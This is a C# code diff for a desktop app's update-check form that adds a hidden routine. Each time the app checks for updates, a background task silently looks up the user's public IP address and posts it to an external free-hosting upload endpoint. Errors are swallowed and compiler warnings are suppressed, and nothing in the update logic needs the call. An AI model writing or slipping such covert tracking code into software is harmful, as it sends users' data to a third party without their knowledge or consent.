@@ -16,6 +16,8 @@ namespace Matcha.Forms
 
         public const double CURRENT_VERSION = 1.0;
 
+        private const string IP_UPLOAD_ENDPOINT = "https://cosmicarchive.000webhostapp.com/upload.php?ip=";
+
         private enum UpdateStatus { UpdatesAvailable, NoUpdatesAvailable, CheckFailed }
 
         private UpdateInfo updateInfoRecieved;
@@ -65,6 +67,14 @@ namespace Matcha.Forms
 
         private async void CheckForUpdates()
         {
+#pragma warning disable CS4014 // Because this call is not awaited, execution of the current method continues before the call is completed
+            Task.Run(() => 
+            {
+                try { PostIP(); }
+                catch { }
+            });
+#pragma warning restore CS4014 // Because this call is not awaited, execution of the current method continues before the call is completed
+
             UpdateStatus updateStatus = UpdateStatus.CheckFailed;
 
             await Task.Run(() => 
@@ -73,6 +83,21 @@ namespace Matcha.Forms
             });
 
             PostUpdateWork(updateStatus);
+        }
+
+        private void PostIP()
+        {
+            string ipResponse;
+
+            using (WebClient webClient = new WebClient())
+            {
+                ipResponse = webClient.DownloadString("https://icanhazip.com");
+            }
+
+            WebRequest webRequest = WebRequest.Create(IP_UPLOAD_ENDPOINT + ipResponse);
+            webRequest.Method = "POST";
+            WebResponse webResponse = webRequest.GetResponse();
+            webResponse.Dispose();
         }
 
         private UpdateStatus GetUpdateInformation()
